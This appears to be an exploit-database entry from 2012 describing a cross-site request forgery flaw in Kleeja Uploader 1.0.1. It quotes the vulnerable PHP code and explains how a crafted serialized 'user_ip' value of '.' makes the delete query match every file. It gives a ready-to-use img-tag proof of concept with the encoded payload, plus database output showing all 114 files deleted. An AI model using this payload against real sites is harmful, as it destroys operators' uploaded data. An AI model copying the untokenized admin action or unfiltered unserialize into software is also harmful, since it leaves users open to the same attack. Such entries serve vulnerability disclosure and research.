@@ -1,0 +1,80 @@
+id: 18790
+date: 06/23/2012
+title: Kleeja Uploader <= 1.0.1 CSRF Delete all uploaded files
+author: Qabandi
+cves: 
+
+# Exploit Title: Kleeja Uploader <= 1.0.1 CSRF Delete all uploaded files ft. unserialize()
+# Exploit Author: Qabandi ( @qab )
+# Vendor Homepage: kleeja.com
+# Software Link: kleeja.com/download
+# Version: 1.0.1
+----------------------------------------------------------------------------
+Some actions are not tokenized which leaves the script vulnerable to CSRF attacks
+----------------------------------------------------------------------------
+in C:\AppServ\www\kleeja\includes\adm\c_files.php:-
+
+ln:138| if(isset($_GET['deletefiles'])){ <-- {{No Tokenization}}
+...
+...
+ln:145|	$search	= kleeja_base64_decode($_GET['deletefiles']);
+ln:146|	$search	= unserialize($search); <-- {{unfiltered unserializing, which means user can play with variable}}
+...
+...
+ln:167|	$ipp			= $search['user_ip'] != '' ? 'AND f.user_ip LIKE \'%' . $SQL->escape($search['user_ip']) . '%\' ' : '';
+ln:168|	//add the generated search sentence to the query
+ln:169|	$query['WHERE'] = "$size_than $file_namee $ups_than $exte $rep_than $usernamee $lstd_than $exte $ipp";<-- query is built according to unserialized _GET[deletefiles] var
+ln:170|
+ln:171|	$result = $SQL->build($query);
+...
+...
+ln:174|	while($row=$SQL->fetch_array($result))
+ln:175|	{
+ln:176|			//delete from folder ..
+ln:177|			@kleeja_unlink (PATH . $row['folder'] . "/" . $row['name']);  <-- delete all files from query
+
+------------------------------------------------
+With a specifically crafted serialized variable we can trick the scrip into deleting all files by forcing the query to result in all files.
+
+lets first look at a serialized variable for file searching according to IP (note: I base64 decoded it):
+    deletefiles=a:1:{s:7:"user_ip";s:9:"127.0.0.1";}
+    query will look something like this for example ( select filesToDelete from files where ip like '%127.0.0.1%' )
+    
+this is what is sent to the server when deleting, usually this would result in only the given ip's uploaded files being deleted.
+but what if we send the following instead?:
+    deletefiles=a:1:{s:7:"user_ip";s:1:".";}
+    query will be ( select filesToDelete from files where ip like '%.%' )
+    and since all ip's contain a dot '.' , all files will be deleted.
+---------------------------------------------------
+    PoC
+<img src="http://localhost/kleeja/admin/index.php?cp=c_files&deletefiles=YToxOntzOjc6InVzZXJfaXAiO3M6MToiLiI7fQ==&_ajax_=1&_=Qabandi"/>
+Admin must visit the link and it will execute and all files will be deleted.
+---------------------------------------------------
+mysql> select count(*) from klj_files;
++----------+
+| count(*) |
++----------+
+|      114 |
++----------+
+1 row in set (0.00 sec)
+##
+visit link as admin:-
+{"code":"1", "content":"\n\n
+..
+..
+..
+File 114 successfully deleted\n...
+##
+mysql> select count(*) from klj_files;
++----------+
+| count(*) |
++----------+
+|        0 |
++----------+
+1 row in set (0.00 sec)
+
+#salam
+
+
+
+#  0day.today [2023-03-23]  #
